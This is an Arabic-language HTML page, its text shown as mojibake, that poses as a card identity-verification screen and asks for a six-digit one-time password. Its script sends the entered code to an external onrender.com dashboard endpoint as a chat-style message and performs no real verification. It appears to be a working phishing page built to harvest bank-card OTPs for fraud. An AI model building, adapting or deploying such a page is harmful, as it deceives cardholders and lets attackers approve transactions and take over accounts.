<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <!-- Header Top Bar -->
  <header class="top-bar">
    <img src="images/logo 1 .png" alt="Ø§Ù„Ø´Ø¹Ø§Ø± Ø§Ù„Ø£ÙŠÙ…Ù†" class="logo right-logo" />
    <h1 class="header-text">ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ</h1>
    <img src="images/wish1.png" alt="Ø§Ù„Ø´Ø¹Ø§Ø± Ø§Ù„Ø£ÙŠØ³Ø±" class="logo left-logo" />
  </header>

  <!-- OTP Container -->
  <div class="modern-container">
    <p class="description">
      Ù„Ù‚Ø¯ Ù‚Ù…Ù†Ø§ Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰ Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ Ø§Ù„Ù…Ø±Ø¨ÙˆØ· Ø¨Ø¨Ø·Ø§Ù‚ØªÙƒ.
    </p>

    <!-- Added image with desc -->
    <div class="otp-image-container">
      <img src="images/desc.jpg" alt="desc" class="otp-image" />
    </div>

    <form id="otpForm" novalidate>
      <div class="form-group">
        <input type="text" id="otpInput" placeholder="Ø§Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚" maxlength="11" required dir="ltr" />
      </div>

      <button type="submit" class="cta-btn" id="otpSubmitBtn">
        <span class="btn-text">ØªØ­Ù‚Ù‚</span>
        <span class="loader" style="display:none;"></span>
      </button>

      <p class="error-text" id="otpErrorText" style="display:none; margin-top:10px;"></p>
    </form>
  </div>

  <script>
document.addEventListener('DOMContentLoaded', () => {
  const otpForm = document.getElementById('otpForm');
  const otpInput = document.getElementById('otpInput');
  const submitBtn = document.getElementById('otpSubmitBtn');
  const btnText = submitBtn.querySelector('.btn-text');
  const loader = submitBtn.querySelector('.loader');
  const errorText = document.getElementById('otpErrorText');

  // Format OTP input as "1 2 3 4 5 6"
  otpInput.addEventListener('input', e => {
    let digits = e.target.value.replace(/\D/g, '').slice(0,6);
    e.target.value = digits.split('').join(' ');
  });

  otpForm.addEventListener('submit', async e => {
    e.preventDefault();
    
    const enteredOtp = otpInput.value.replace(/\s/g, ''); // remove spaces

    if (enteredOtp.length !== 6 || /\D/.test(enteredOtp)) {
      errorText.textContent = 'Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 6 Ø£Ø±Ù‚Ø§Ù… ØµØ­ÙŠØ­Ø©';
      errorText.style.display = 'block';
      return;
    }

    // Hide error, show loader
    errorText.style.display = 'none';
    btnText.style.display = 'none';
    loader.style.display = 'inline-block';
    submitBtn.disabled = true;

    try {
      // Send number + OTP to backend
      const response = await fetch("https://dashboard-xwzz.onrender.com/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          text: `\nğŸ”‘\nØ±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚: \n${enteredOtp}`
        })
      });

      console.log("Response status:", response.status);

      if (!response.ok) throw new Error(`HTTP ${response.status}`);

      // Success: redirect after 2 seconds
      setTimeout(() => {
        
      }, 2000);

    } catch (error) {
      console.error(error);
      errorText.textContent = 'Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.';
      errorText.style.display = 'block';
      loader.style.display = 'none';
      btnText.style.display = 'inline-block';
      submitBtn.disabled = false;
    }
  });

});
</script>


</body>
</html>
